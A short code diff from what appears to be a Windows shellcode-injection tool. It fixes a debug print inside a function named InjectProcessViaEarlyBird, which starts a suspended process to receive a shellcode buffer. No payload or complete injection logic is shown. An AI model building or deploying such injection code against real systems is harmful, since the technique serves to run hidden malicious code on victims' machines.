@@ -135,7 +135,7 @@ BOOL InjectProcessViaEarlyBird(_In_ PBYTE buf, _In_ SIZE_T szShellcodeLen, _Out_
 	HANDLE hThread 			= NULL;
 	HANDLE hStdOutRead 		= NULL;		// Read stdout through anon pipe
 
-	_dbg("[i] Creating \"%s\" as a suspended process. \n", sProcName);
+	_dbg("[i] Creating \"%s\" as a suspended process. \n", lpProcessName);
 	if (!CreateTemporaryProcess(lpProcessName, &dwProcId, &hProcess, &hThread, &hStdOutRead)) {
 		_dbg("Failed to create debugged process : %d\n", GetLastError());
 		return FALSE;
